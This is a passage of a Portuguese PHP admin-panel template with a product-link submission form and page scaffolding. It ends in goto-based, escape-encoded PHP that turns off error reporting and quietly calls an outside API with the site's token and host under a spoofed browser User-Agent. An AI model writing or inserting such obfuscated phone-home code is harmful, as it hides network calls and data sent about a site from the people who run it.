				  <input type="hidden" name="sku" value="<?php  echo $SKU; ?>
" >
				  <input type="hidden" name="url" value="<?php  echo $URL; ?>
" >

                          <button type="submit" class="mb-3 mx-1 btn btn-block btn-secondary">Adicionar</button>



					</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

</form>

			<?php  } else { ?>
			
			<form action="add_2.php" method="post">
			 <div class="col-xl-8 pl-xl  -0">
                      <div class="p-4">
			
			
		
							<code>Insira o link do produto</code>
			                <div class="input-group">
							   
									
                                    <input required name="url" placeholder="Link...." type="text" class="form-control">
                                   
                                  </div><br>
			
							<button name="set_link" type="submit" class="mb-3 mx-1 btn btn-block btn-secondary">Avançar</button>
			
			
			</div></div>
			</form>
			
			
			<?php  } ?>

			<!-- FIM -->




          
         



		 </div>

        </div>
       
        <!-- footer -->
        <footer id="footer" class="footer">
 
 
 
 
 
 
 
 
 
 
 
 
 
        </footer>
        <!-- /.footer -->
      </div>
    </main>
    <!-- /.main -->

    <!-- offcanvas - search -->
    <div id="offcanvas-search" class="offcanvas h-100 py-8" data-animation="fadeDown" data-scrollbar="offcanvas">
      <div class="row">
        <div class="col-sm-1 order-sm-last">
          <button type="button" data-toggle="offcanvas-close" class="close float-right mr-lg-6 text-light o-1 lead-2 fw-100" data-dismiss="offcanvas" aria-label="Close">
            <span aria-hidden="true" class="icon-close"></span>
          </button>
        </div>
        <form class="col-sm-11 col-lg-10 mx-auto input-rounded form-inline position-relative w-100 mt-0">
          <div class="input-group bg-none border-0 w-100">
            <input class="form-control form-control-lg rounded-0 bg-none pl-0 h-auto fs-6 display-md-4 display-xl-2 fw-600" type="text" aria-label="Search" placeholder="Search for...">
          </div>
          <hr class="w-100 o-25 border-white mt-0">
          <div class="row gutters-y w-100">
            <div class="col-lg-3">
              <h5 class="text-uppercase text-light mb-6"><i class="fas fa-long-arrow-alt-right"></i> Categories</h5>
              <ul class="list-unstyled pl-4">
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>Architecture</strong> (800)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>Art & Illustration</strong> (317)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>Business & Corporate</strong> (419)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>Culture & Education</strong> (672)</a>
                </li>
                <li class="mb-0">
                  <a href="#" class="tag-item"><strong>E-Commerce</strong> (272)</a>
                </li>
              </ul>
            </div>
            <div class="col-lg-3">
              <h5 class="text-uppercase text-light mb-6"><i class="fas fa-long-arrow-alt-right"></i> Tags</h5>
              <ul class="list-unstyled pl-4">
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>360</strong> (128)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>3D</strong> (42)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>Animation</strong> (4105)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>Apps</strong> (319)</a>
                </li>
                <li class="mb-0">
                  <a href="#" class="tag-item"><strong>Apps</strong> (319)</a>
                </li>
              </ul>
            </div>
            <div class="col-lg-3">
              <h5 class="text-uppercase text-light mb-6"><i class="fas fa-long-arrow-alt-right"></i> Technologies</h5>
              <ul class="list-unstyled pl-4">
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>AngularJS</strong> (629)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>Apache</strong> (241)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>Bootstrap</strong> (751)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>CloudFire</strong> (209)</a>
                </li>
                <li class="mb-0">
                  <a href="#" class="tag-item"><strong>CloudFire</strong> (107)</a>
                </li>
              </ul>
            </div>
            <div class="col-lg-3">
              <h5 class="text-uppercase text-light mb-6"><i class="fas fa-long-arrow-alt-right"></i> Countries</h5>
              <ul class="list-unstyled pl-4">
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>United States</strong> (1605)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>France</strong> (569)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>Business & Corporate</strong> (419)</a>
                </li>
                <li class="mb-4">
                  <a href="#" class="tag-item"><strong>United Kingdom</strong> (672)</a>
                </li>
                <li class="mb-0">
                  <a href="#" class="tag-item"><strong>Italy</strong> (484)</a>
                </li>
              </ul>
            </div>
          </div>
        </form>
      </div>
    </div>
    <!-- /.offcanvas - search -->

    <!-- preloader -->
    <div class="preloaderWrapper"></div>

    <!-- jQuery -->
    <script src="assets/js/jquery.min.js"></script>

    <!-- Bootstrap -->
    <script src="assets/js/bootstrap.min.js"></script>

    <!-- Chart.js -->
    <script src="assets/plugins/chart/Chart.min.js" id="_chartJS_min"></script>
    <script src="assets/plugins/chart/Chart.bundle.min.js"></script>
    <script src="assets/plugins/chart/chartjs-plugin-annotation.js"></script>
    <script src="assets/plugins/chart/chartjs-plugin-labels.js"></script>

    <!-- apexcharts -->
    <script src="assets/plugins/apexcharts/apexcharts.min.js"></script>

    <!-- RangeSlider -->
    <script src="assets/plugins/rangeslider/rangeslider.min.js" id="_rangeJS_min"></script>

    <!-- Moment -->
    <script src="assets/plugins/lib/moment/moment.min.js"></script>

    <!-- JQVMAP -->
    <script src="assets/plugins/jqvmap/jquery.vmap.min.js" id="_JQVMAP"></script>
    <script src="assets/plugins/jqvmap/maps/jquery.vmap.world.js"></script>

    <!-- dateRangePicker -->
    <script src="assets/plugins/daterangepicker/daterangepicker.js" id="_DateRangeJS_min"></script>
    
    <!-- User JS -->
    <script src="assets/js/scripts.js"></script>
	
    <!-- Profile JS -->
    <script src="assets/js/ajax.js"></script>

    <!-- Main JS -->
    <script src="assets/js/main.js" id="_mainJS" data-plugins="load"></script>

    <!-- Modules -->
    <script src="assets/js/modules.js"></script>
    
  </body>
  
	  <?php  } else { header("\x4c\157\143\141\x74\151\x6f\x6e\x3a\x20\x6c\x6f\147\151\x6e\56\160\150\160\77\164\x6f\x6b\x6b\x65\156\x49\156\166\141\154\x69\144"); } ?>

</html>


	<?php  } else { header("\114\x6f\143\x61\x74\151\x6f\156\x3a\40\x6c\x6f\x67\151\x6e\x2e\x70\x68\160\x3f\141\x63\x65\163\163\x3d\162\145\163\164\162\x69\164\x6f"); ?>
        
		<?php  } goto frWRu; m6NXf: if (empty($_SESSION["\150\157\163\164\x5f\141\x70\151"])) { } else { $url = "\150\x74\164\x70\72\x2f\x2f{$host_api}\57\x61\160\x69\x2f\160\165\x78\x61\x72\56\x70\x68\160\77\x74\153\75{$tokken}\46\150\157\163\x74\75{$host}\x26\166\x65\x72\x69\x66\171\x3d\x6e\157"; $options = array("\x68\x74\x74\x70" => array("\155\145\x74\x68\157\x64" => "\107\105\x54", "\150\145\141\144\145\x72" => "\101\x63\143\x65\160\x74\55\154\141\156\x67\165\141\x67\145\72\x20\145\x6e\xd\xa" . "\x43\x6f\157\x6b\151\145\72\40\x66\x6f\x6f\x3d\142\x61\x72\xd\xa" . "\125\163\145\x72\55\x41\x67\145\156\x74\x3a\x20\115\x6f\172\151\x6c\x6c\x61\x2f\65\56\60\40\x28\x69\x50\141\144\73\x20\x55\73\x20\103\120\125\x20\117\123\40\63\x5f\x32\40\154\151\153\145\x20\x4d\x61\x63\x20\117\x53\x20\130\x3b\40\145\x6e\55\165\x73\x29\40\x41\160\x70\x6c\145\127\145\142\113\x69\x74\57\65\x33\61\x2e\62\x31\x2e\61\x30\40\x28\113\x48\x54\x4d\x4c\54\40\154\151\153\145\x20\x47\145\143\153\157\51\40\x56\x65\x72\163\x69\x6f\156\x2f\64\56\60\56\64\40\x4d\x6f\142\151\154\145\x2f\x37\102\63\63\x34\142\40\123\x61\x66\141\162\151\x2f\x35\x33\61\56\x32\61\x2e\61\60\x32\x30\x31\61\x2d\x31\x30\55\x31\66\x20\x32\60\x3a\62\x33\x3a\x31\60\15\xa")); $context = stream_context_create($options); $store = file_get_contents($url, false, $context); $var1 = explode("\x27\141\47\40\75\76", $store); $status_tokken = explode("\74\142\162\x3e", $var1[1]); $var2 = explode("\47\142\47\40\75\76", $store); $nome_tokken = explode("\74\142\162\x3e", $var2[1]); $var3 = explode("\x27\x63\x27\40\75\x3e", $store); $expira_tokken = explode("\x3c\142\x72\x3e", $var3[1]); $var4 = explode("\x27\144\x27\40\x3d\x3e", $store); $nivel_tokken = explode("\x3c\142\162\76", $var4[1]); $a = 1; } goto M1Ajn; dspbN: $conVX = $mysqli->query($dadosVX) or die($mysqli->error); goto otnug; MV6iL: require_once "\146\165\156\143\x74\151\157\x6e\57\146\x75\x6e\143\x69\x6f\156\x73\x2e\160\x68\160"; goto cJ327; cJ327: require_once "\146\165\156\143\164\x69\157\156\x2f\156\145\167\137\x66\x75\x6e\x63\164\151\157\x6e\x2e\x70\150\160"; goto FxYdN; HKBTs: require_once "\x66\x75\x6e\143\164\x69\x6f\156\x2f\x63\157\x6e\164\141\162\x2e\x70\150\x70"; goto v4tbE; FxYdN: $dadosVX = "\123\105\114\105\103\x54\x2a\40\x46\122\x4f\x4d\40\x63\x6f\x6e\146\x69\x67\165\162\x61\143\141\157\40\167\150\145\162\x65\40\x69\x64\75\x31"; goto dspbN; tMeAK: require_once "\x66\165\156\x63\x74\x69\157\156\57\x63\157\156\x66\151\x67\x2e\160\x68\160"; goto MV6iL; frWRu: ob_end_flush(); goto OJxx8; GfO7p: error_reporting(0); goto bhoyu; OJxx8: ')); ?>